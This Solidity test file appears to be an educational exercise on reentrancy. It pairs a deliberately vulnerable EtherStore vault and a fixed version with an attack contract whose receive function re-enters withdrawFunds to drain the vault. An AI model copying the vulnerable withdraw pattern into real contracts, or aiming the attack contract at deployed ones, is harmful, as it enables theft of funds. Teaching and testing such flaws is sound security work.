// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

/*
Name: Reentrancy Vulnerability

Description:
The EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows 
an attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract. 
The vulnerability arises due to the withdrawFunds function in the EtherStore contract,
where the Ether is transferred to the attacker's address before updating their balance. 
This allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update, 
leading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.

Scenario:
EtherStore is a simple vault, it can manage everyone's ethers.
But it's vulnerable, can you steal all the ethers ?

Mitigation:
Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.

REF
https://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a
https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/

*/

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");

        // check if after send still enough to avoid underflow
        if (balances[msg.sender] >= _weiToWithdraw) {
            balances[msg.sender] -= _weiToWithdraw;
        }
    }
}

contract EtherStoreRemediated {
    mapping(address => uint256) public balances;
    bool internal locked;

    modifier nonReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {
        require(balances[msg.sender] >= _weiToWithdraw);
        balances[msg.sender] -= _weiToWithdraw;
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");
    }
}

contract ContractTest is Test {
    EtherStore store;
    EtherStoreRemediated storeRemediated;
    EtherStoreAttack attack;
    EtherStoreAttack attackRemediated;

    function setUp() public {
        store = new EtherStore();
        storeRemediated = new EtherStoreRemediated();
        attack = new EtherStoreAttack(address(store));
        attackRemediated = new EtherStoreAttack(address(storeRemediated));
        vm.deal(address(store), 5 ether);
        vm.deal(address(storeRemediated), 5 ether);
        vm.deal(address(attack), 2 ether);
        vm.deal(address(attackRemediated), 2 ether);
    }

    function testReentrancy() public {
        attack.Attack();
    }

    function testFailRemediated() public {
        attackRemediated.Attack();
    }
}

contract EtherStoreAttack is Test {
    EtherStore store;

    constructor(address _store) {
        store = EtherStore(_store);
    }

    function Attack() public {
        console.log("EtherStore balance", address(store).balance);

        store.deposit{value: 1 ether}();

        console.log(
            "Deposited 1 Ether, EtherStore balance",
            address(store).balance
        );
        store.withdrawFunds(1 ether); // exploit here

        console.log("Attack contract balance", address(this).balance);
        console.log("EtherStore balance", address(store).balance);
    }

    // fallback() external payable {}

    // we want to use fallback function to exploit reentrancy
    receive() external payable {
        console.log("Attack contract balance", address(this).balance);
        console.log("EtherStore balance", address(store).balance);
        if (address(store).balance >= 1 ether) {
            store.withdrawFunds(1 ether); // exploit here
        }
    }
}
